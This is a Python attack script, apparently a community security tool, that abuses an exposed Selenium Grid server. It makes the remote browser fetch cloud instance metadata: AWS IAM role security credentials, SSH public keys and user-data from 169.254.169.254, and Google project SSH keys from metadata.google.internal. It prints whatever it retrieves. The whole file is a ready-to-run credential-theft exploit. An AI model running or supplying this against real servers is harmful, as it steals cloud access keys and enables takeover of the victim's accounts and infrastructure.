#!/usr/bin/env python
#
# sel.py
# Abuse Selenium for AWS Info
#
# Author: @random_robbie

import requests
import dns.resolver
import dns.reversename
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from time import sleep
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


def strip_html(striphtml):
	striphtml.replace('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
	striphtml2 = striphtml.replace('</pre></body></html>','')
	striphtml3 = striphtml2.replace('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
	return striphtml3
	
def ipToArpaName(x): 
	return '.'.join(x.split('.')[::-1]) + '.in-addr.arpa'

def grab_sshgoogle(server,desired_caps):
	grid_url = ""+server+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	driver.get("http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json")
	striphtml = driver.page_source
	gg = strip_html(striphtml)
	if 'ssh' in gg:
		print ("\n\n[*] Google Public SSH Key:\n  "+str(gg)+" [*]")
		driver.quit()
	else:
		print ("\n\n[*] Unable to get SSH Key [*]")
		driver.quit()

def grab_sshkeys (server,desired_caps):
	grid_url = ""+server+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	driver.get("http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key")
	striphtml = driver.page_source
	gg = strip_html(striphtml)
	if 'ssh-rsa' in gg:
		print ("\n\n[*] AWS Public SSH Key:\n  "+str(gg)+" [*]")
		driver.quit()
	else:
		print ("\n\n[*] Unable to get SSH Key [*]")
		driver.quit()
def grab_userdata (server,desired_caps):
	grid_url = ""+server+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	driver.get("http://169.254.169.254/latest/")
	striphtml = driver.page_source
	gg = strip_html(striphtml)
	if 'user-data' in gg:
		b = driver.get("http://169.254.169.254/latest/user-data")
		print ("\n\n[*] User Data: "+str(b)+" [*]")
		driver.quit()
	else:
		print ("\n\n[*] No User Data [*]")
		driver.quit()
	
	
	
def grab_iam (server,desired_caps):
	grid_url = ""+server+"/wd/hub"
	driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
	driver.get("http://169.254.169.254/latest/meta-data/")
	striphtml = driver.page_source
	tt = striphtml.strip('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">')
	gg = tt.strip('</pre></body></html>')
	if 'iam' in str(gg):
		driver.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
		striphtml2 = driver.page_source
		gg2 = strip_html(striphtml2)
		print ("[*] IAM Role Name: "+gg2+" [*]")
		driver.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+gg2+"/")
		striphtml3 = driver.page_source
		tt3 = striphtml3.replace('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
		gg3 = tt3.replace('</pre></body></html>','')
		print ("[*] IAM Role Key: "+gg3+" \n[*]")
		driver.quit()
	else:
		print ("\n\n[*] No IAM Role [*]")
		driver.quit()



try:
	parser = argparse.ArgumentParser()
	parser.add_argument("-s", "--server", required=True, help="Selenium Server IP")
	args = parser.parse_args()
	server = args.server
	o = urlparse(server)
	qname = dns.reversename.from_address(o.hostname)
	answer = dns.resolver.query(qname, 'PTR')
	for rr in answer:
		#print(rr)
	
		if 'google' in str(rr):
			desired_caps = DesiredCapabilities.CHROME
			grab_sshgoogle(server,desired_caps)
		else:
	
			desired_caps = DesiredCapabilities.CHROME
			grab_iam (server,desired_caps)
			grab_sshkeys (server,desired_caps)
			grab_userdata (server,desired_caps)
except Exception as e:
		print (e)
